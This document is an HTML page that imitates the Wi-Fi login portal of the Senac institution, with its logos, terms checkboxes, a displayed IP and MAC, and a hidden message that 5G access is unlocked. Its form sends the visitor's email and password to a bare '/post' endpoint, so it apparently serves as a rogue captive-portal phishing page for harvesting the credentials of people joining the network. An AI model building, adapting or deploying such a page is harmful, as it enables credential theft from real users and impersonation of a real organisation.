<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Portal Wi-Fi Senac</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    /* (SEU CSS COLADO AQUI, IGUAL O ANTIGO) */
    body {
      background-color: #f2f2f2;
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
    }

    .container {
      width: 92%;
      max-width: 320px;
      margin: 40px auto;
      background-color: white;
      border-radius: 10px;
      padding: 20px;
      text-align: center;
      box-shadow: 0 0 8px rgba(0,0,0,0.1);
    }

    .logos {
      display: flex;
      justify-content: center;
      align-items: center;
      margin-bottom: 10px;
    }

    .logo-img {
      height: 120px;
      margin: 0 5px;
    }

    hr {
      border: none;
      border-top: 1px solid #eaeaea;
      margin: 10px 0;
    }

    input[type="email"],
    input[type="password"] {
      width: calc(100% - 20px);
      padding: 10px;
      margin-top: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
      background-color: #ffffff;
      transition: all 0.3s ease;
      box-sizing: border-box;
    }

    input[type="email"]:focus,
    input[type="password"]:focus {
      background-color: #ffffff;
      outline: none;
      border: 1px solid #2ecc71;
      box-shadow: 0 0 5px rgba(46, 204, 113, 0.6);
    }

    label {
      display: block;
      text-align: left;
      font-size: 14px;
      margin-top: 15px;
      margin-bottom: 5px;
      color: #222;
    }

    input[type="checkbox"] {
      appearance: none;
      width: 16px;
      height: 16px;
      border: 1px solid #007bff;
      border-radius: 4px;
      background-color: white;
      vertical-align: middle;
      position: relative;
      cursor: pointer;
      margin-right: 5px;
    }

    input[type="checkbox"]:checked {
      background-color: #007bff;
      border: none;
    }

    input[type="checkbox"]:checked::after {
      content: "✔";
      color: white;
      font-size: 12px;
      position: absolute;
      top: 0;
      left: 3px;
    }

    .checkbox-label {
      font-size: 14px;
      color: #222;
      font-weight: bold;
    }

    .checkbox-label a {
      color: #004a99;
      font-weight: bold;
      text-decoration: underline;
    }

    .login-button {
      background-color: #f7931e;
      color: white;
      border: none;
      padding: 12px;
      margin-top: 20px;
      width: 100%;
      font-size: 16px;
      border-radius: 5px;
      cursor: pointer;
      font-weight: normal;
      transition: background-color 0.3s ease;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }

    .yellow-link {
      color: #f0b400;
      text-decoration: underline;
      font-size: 14px;
      font-weight: 300;
    }

    .support-text {
      font-size: 14px;
      color: #444;
      margin-top: 15px;
    }

    .ip-info {
      font-size: 12px;
      color: #444;
      margin-top: 10px;
    }

    .success-message {
      background-color: white;
      padding: 20px;
      border-radius: 12px;
      margin-top: 50px;
      text-align: center;
      max-width: 300px;
      margin-left: auto;
      margin-right: auto;
      box-shadow: 0 4px 15px rgba(0,0,0,0.15);
    }

    .success-message p {
      margin: 5px 0;
    }

    .success-message .sub {
      font-weight: normal;
    }

    .success-message .bold {
      font-weight: bold;
    }

    .hidden {
      display: none;
    }
  </style>
</head>
<body>
  <div class="container" id="loginContainer">
    <div class="logos">
      <img src="senac.png" alt="Senac Logo" class="logo-img">
      <img src="wifi.png" alt="Wi-Fi Logo" class="logo-img">
    </div>

    <hr>

    <!-- COMEÇO DO FORMULÁRIO CORRIGIDO -->
    <form method="post" action="/post">
      <input type="email" name="email" placeholder="Login" required>
      <input type="password" name="senha" placeholder="Senha" required>

      <label>
        <input type="checkbox" id="termos" required>
        <span class="checkbox-label">Aceito os <a href="#">Termos de uso.</a></span>
      </label>
      <label>
        <input type="checkbox" id="privacidade" required>
        <span class="checkbox-label">Li e aceito a <a href="#">Política de privacidade.</a></span>
      </label>

      <button class="login-button" type="submit">Efetuar login</button>
    </form>
    <!-- FIM DO FORMULÁRIO -->

    <p><a href="#" class="yellow-link">Esqueci minha senha</a></p>

    <hr>

    <p class="support-text">Problemas para se autenticar?</p>
    <p><a href="#" class="yellow-link">Abra um chamado</a></p>

    <p class="ip-info">IP:192.168.23.51 | MAC:52:1F:9A:4D:11:3C</p>
  </div>

  <div class="success-message hidden" id="successMessage">
    <p class="bold">Acesso ao 5G liberado</p>
    <p class="sub">Reconecte ao wifi</p>
    <p class="bold">CONECTA_SENAC</p>
  </div>

  <script>
    // SE PRECISAR DE ALGUM SCRIPT, PODE SER ADICIONADO AQUI
  </script>
</body>
</html>
